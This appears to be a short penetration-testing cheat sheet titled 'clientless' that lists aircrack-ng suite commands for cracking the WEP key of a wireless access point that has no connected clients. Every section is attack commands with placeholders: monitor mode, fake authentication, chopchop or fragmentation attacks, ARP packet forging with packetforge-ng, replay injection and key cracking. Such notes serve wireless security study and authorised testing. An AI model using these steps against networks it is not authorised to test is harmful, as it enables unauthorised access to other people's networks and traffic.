# clientless

### Setup

{% code overflow="wrap" %}
```
sudo airmon-ng check kill

sudo airmon-ng start wlan0
```
{% endcode %}

Conduct a fake authentication attack against the AP:

```

aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
```

Run attack 4, the KoreK chopchop attack (or attack 5, the fragmentation attack):

#### KoreK Chop Chop Attack

```
aireplay-ng -4 -b <AP MAC> -h <Your MAC> <interface>
```

#### Fragmentation Attack

```
aireplay-ng -5 -b <AP MAC> -h <Your MAC> <interface>
```

Craft an ARP request packet using packetforge-ng:

{% code overflow="wrap" %}
```

packetforge-ng -0 -a <AP MAC> -h <Your MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <output filename>
```
{% endcode %}

Inject the packet into the network using attack 2, the interactive packet replay attack:

```
aireplay-ng -2 -r <xor packet filename> <interface>
```

Crack the WEP key using Aircrack-ng:

```
aircrack-ng <capture>
```
